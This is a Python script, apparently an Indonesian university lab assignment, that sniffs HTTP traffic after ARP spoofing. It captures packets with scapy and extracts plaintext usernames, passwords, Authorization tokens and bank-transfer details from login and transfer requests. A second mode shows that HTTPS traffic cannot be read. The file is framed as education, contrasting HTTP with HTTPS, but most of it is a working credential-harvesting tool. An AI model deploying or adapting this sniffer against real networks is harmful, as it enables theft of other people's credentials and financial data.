#!/usr/bin/env python3
"""
Credential Sniffer Script
===========================
Tugas Kelompok 5 - Network Programming & Administration

Menangkap dan mengekstrak kredensial dari traffic HTTP yang tidak terenkripsi
setelah ARP Spoofing berhasil dilakukan. (MITRE ATT&CK: T1040 - Network Sniffing)

⚠️  PERINGATAN: Script ini HANYA untuk tujuan EDUKASI dalam lingkungan lab terisolasi.

Cara Kerja:
1. Setelah ARP Spoofing, traffic korban melewati mesin attacker
2. Script ini menangkap paket HTTP yang berisi data login
3. Mengekstrak username, password, dan data sensitif lainnya
4. Mendemonstrasikan bahaya pengiriman data tanpa enkripsi

Perbandingan:
- HTTP: Kredensial dapat dibaca dalam PLAINTEXT ✗
- HTTPS: Kredensial TERENKRIPSI dan tidak dapat dibaca ✓
"""

import sys
import argparse
import json
from datetime import datetime
from scapy.all import sniff, TCP, IP, Raw, conf
from colorama import init, Fore, Back, Style

init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║           CREDENTIAL SNIFFER - HTTP TRAFFIC                  ║
║         Network Programming & Administration Lab             ║
║                                                              ║
║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                            ║
║  MITRE ATT&CK: T1040 (Network Sniffing)                     ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

class CredentialSniffer:
    def __init__(self, interface=None, target_port=5000):
        self.interface = interface or conf.iface
        self.target_port = target_port
        self.credentials_found = []
        self.packets_captured = 0
    
    def process_packet(self, packet):
        """Memproses setiap paket yang ditangkap"""
        self.packets_captured += 1
        
        if not packet.haslayer(Raw):
            return
        
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
        except:
            return
        
        # Cek apakah ini request HTTP
        if not any(method in payload for method in ['POST', 'GET', 'PUT']):
            return
        
        src_ip = packet[IP].src if packet.haslayer(IP) else "unknown"
        dst_ip = packet[IP].dst if packet.haslayer(IP) else "unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Tampilkan HTTP request
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"[{timestamp}] HTTP Traffic Terdeteksi")
        print(f"{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Source: {src_ip} → Destination: {dst_ip}{Style.RESET_ALL}")
        
        # Cek apakah ada data login
        if '/api/login' in payload:
            print(f"{Fore.RED}{Back.WHITE}")
            print(f"  🔓 LOGIN REQUEST TERDETEKSI!")
            print(f"{Style.RESET_ALL}")
            
            # Ekstrak body JSON dari HTTP request
            try:
                # Cari body JSON dalam payload
                json_start = payload.find('{')
                json_end = payload.rfind('}') + 1
                
                if json_start != -1 and json_end > json_start:
                    body = json.loads(payload[json_start:json_end])
                    
                    if 'username' in body or 'password' in body:
                        username = body.get('username', 'N/A')
                        password = body.get('password', 'N/A')
                        
                        print(f"{Fore.RED}  ╔══════════════════════════════════════╗")
                        print(f"  ║  KREDENSIAL DITEMUKAN (PLAINTEXT)!   ║")
                        print(f"  ╠══════════════════════════════════════╣")
                        print(f"  ║  Username: {username:<26}║")
                        print(f"  ║  Password: {password:<26}║")
                        print(f"  ╚══════════════════════════════════════╝{Style.RESET_ALL}")
                        
                        self.credentials_found.append({
                            'timestamp': timestamp,
                            'src_ip': src_ip,
                            'dst_ip': dst_ip,
                            'username': username,
                            'password': password
                        })
                        
                        print(f"\n{Fore.YELLOW}[!] Total kredensial ditemukan: {len(self.credentials_found)}{Style.RESET_ALL}")
            except json.JSONDecodeError:
                pass
        
        # Cek apakah ada data transfer
        elif '/api/transfer' in payload:
            print(f"{Fore.RED}  💸 TRANSFER REQUEST TERDETEKSI!{Style.RESET_ALL}")
            
            try:
                json_start = payload.find('{')
                json_end = payload.rfind('}') + 1
                
                if json_start != -1 and json_end > json_start:
                    body = json.loads(payload[json_start:json_end])
                    
                    print(f"{Fore.RED}  ╔══════════════════════════════════════╗")
                    print(f"  ║  DATA TRANSFER (PLAINTEXT)!          ║")
                    print(f"  ╠══════════════════════════════════════╣")
                    print(f"  ║  From: {body.get('from', 'N/A'):<30}║")
                    print(f"  ║  To:   {body.get('to', 'N/A'):<30}║")
                    print(f"  ║  Amount: Rp {body.get('amount', 'N/A'):<24}║")
                    print(f"  ║  Desc: {body.get('description', 'N/A'):<30}║")
                    print(f"  ╚══════════════════════════════════════╝{Style.RESET_ALL}")
            except json.JSONDecodeError:
                pass
        
        # Cek apakah ada Authorization header/token
        if 'Authorization' in payload or 'token' in payload.lower():
            print(f"{Fore.MAGENTA}  🔑 TOKEN/AUTH HEADER TERDETEKSI!{Style.RESET_ALL}")
            
            # Ekstrak token
            for line in payload.split('\n'):
                if 'Authorization' in line:
                    print(f"{Fore.MAGENTA}  Token: {line.strip()}{Style.RESET_ALL}")
        
        # Status counter
        print(f"\n{Fore.CYAN}[*] Total paket dicapture: {self.packets_captured}{Style.RESET_ALL}", 
              end="", flush=True)
    
    def process_https_packet(self, packet):
        """
        Mendemonstrasikan bahwa HTTPS traffic TIDAK DAPAT dibaca
        """
        self.packets_captured += 1
        
        if not packet.haslayer(Raw):
            return
        
        payload = packet[Raw].load
        
        # HTTPS traffic akan tampil sebagai data biner terenkripsi
        if packet.haslayer(TCP) and packet[TCP].dport == 5443:
            timestamp = datetime.now().strftime("%H:%M:%S")
            src_ip = packet[IP].src if packet.haslayer(IP) else "unknown"
            
            print(f"\n{Fore.GREEN}[{timestamp}] HTTPS Traffic dari {src_ip} → Port 5443")
            print(f"  🔒 Data TERENKRIPSI - Tidak dapat dibaca!")
            print(f"  Hex dump (tidak berguna): {payload[:32].hex()}")
            print(f"  ↑ Attacker tidak dapat mengekstrak informasi apapun{Style.RESET_ALL}")
    
    def start(self, mode='http'):
        """Mulai sniffing"""
        print(BANNER)
        
        print(f"{Fore.CYAN}[*] Interface: {self.interface}")
        print(f"[*] Mode: {'HTTP (Vulnerable)' if mode == 'http' else 'HTTPS (Secure)'}")
        print(f"[*] Target Port: {self.target_port}")
        print(f"[*] Tekan Ctrl+C untuk berhenti\n{Style.RESET_ALL}")
        
        if mode == 'http':
            # Sniff HTTP traffic (port 5000)
            bpf_filter = f"tcp port {self.target_port}"
            callback = self.process_packet
        else:
            # Sniff HTTPS traffic (port 5443) - to show it's encrypted
            bpf_filter = f"tcp port {self.target_port}"
            callback = self.process_https_packet
        
        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=callback,
                store=False
            )
        except KeyboardInterrupt:
            self.print_summary()
    
    def print_summary(self):
        """Tampilkan ringkasan hasil sniffing"""
        print(f"\n\n{Fore.YELLOW}{'='*70}")
        print(f"RINGKASAN SNIFFING")
        print(f"{'='*70}{Style.RESET_ALL}")
        print(f"Total paket dicapture: {self.packets_captured}")
        print(f"Total kredensial ditemukan: {len(self.credentials_found)}")
        
        if self.credentials_found:
            print(f"\n{Fore.RED}Kredensial yang berhasil diintersep:{Style.RESET_ALL}")
            for i, cred in enumerate(self.credentials_found, 1):
                print(f"  {i}. [{cred['timestamp']}] {cred['src_ip']} → {cred['dst_ip']}")
                print(f"     Username: {cred['username']}")
                print(f"     Password: {cred['password']}")
        else:
            print(f"\n{Fore.GREEN}Tidak ada kredensial yang ditemukan.")
            print(f"(Jika menggunakan HTTPS, ini menunjukkan bahwa enkripsi bekerja!){Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="HTTP/HTTPS Credential Sniffer - Educational Purpose Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh Penggunaan:
  # Sniff HTTP traffic (vulnerable app)
  python sniff_credentials.py --mode http --port 5000

  # Sniff HTTPS traffic (secure app) - menunjukkan data terenkripsi
  python sniff_credentials.py --mode https --port 5443

  # Dengan interface spesifik
  python sniff_credentials.py --mode http --port 5000 -i eth0
        """
    )
    
    parser.add_argument("--mode", choices=['http', 'https'], default='http',
                       help="Mode sniffing: http (vulnerable) atau https (secure)")
    parser.add_argument("--port", type=int, default=5000,
                       help="Port target (default: 5000 untuk HTTP, 5443 untuk HTTPS)")
    parser.add_argument("-i", "--interface", default=None,
                       help="Network interface (default: auto-detect)")
    
    args = parser.parse_args()
    
    sniffer = CredentialSniffer(interface=args.interface, target_port=args.port)
    sniffer.start(mode=args.mode)


if __name__ == "__main__":
    main()
